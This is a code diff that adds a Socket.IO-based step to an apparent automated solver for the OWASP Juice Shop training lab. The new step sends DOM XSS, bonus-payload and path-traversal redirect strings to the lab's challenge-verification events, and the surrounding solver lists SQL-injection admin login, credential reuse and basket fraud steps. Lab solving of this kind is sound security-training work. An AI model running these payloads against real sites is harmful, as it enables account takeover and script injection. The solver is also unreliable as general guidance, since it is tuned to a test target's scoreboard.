@@ -175,6 +175,32 @@ def _uploads(c):
         pass
 
 
+def _socket_xss(c):
+    """DOM XSS + Bonus Payload + Cross-Site Imaging via the frontend's Socket.IO verify events
+    (engine.io v4 polling handshake -> emit). Server solves on contains/regex — no browser."""
+    import json
+    import re
+    eio = "/socket.io/?EIO=4&transport=polling"
+    dom = '<iframe src="javascript:alert(`xss`)">'
+    bonus = ('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" '
+             'src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076'
+             '&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true'
+             '&show_reposts=false&show_teaser=true"></iframe>')
+    svg = "../../../redirect?to=https://cataas.com/cat&x=https://github.com/juice-shop/juice-shop"
+    try:
+        sid = re.search(r'"sid":"([^"]+)"', c.get(eio).text).group(1)
+        q = eio + "&sid=" + sid
+        c.post(q, content="40")                       # socket.io namespace connect
+        try:
+            c.get(q, timeout=4)                        # receive connect-ack (avoid the long-poll)
+        except Exception:
+            pass
+        c.post(q, content="42" + json.dumps(["verifyLocalXssChallenge", dom + bonus]))
+        c.post(q, content="42" + json.dumps(["verifySvgInjectionChallenge", svg]))
+    except Exception:
+        pass
+
+
 def solve(base_url: str) -> dict:
     """Run the full Juice Shop lab solver against a live instance; report scoreboard delta."""
     try:
@@ -192,7 +218,8 @@ def solve(base_url: str) -> dict:
         admin = _login(c, _ADMIN_SQLI, "x")
         AH = {"Authorization": "Bearer %s" % admin.get("token")} if admin.get("token") else {}
         for step in (_sqli_logins, _known_cred_logins, _known_login_challenges, _registrations,
-                     _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud):
+                     _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud,
+                     _socket_xss):
             try:
                 step(c)
             except Exception:
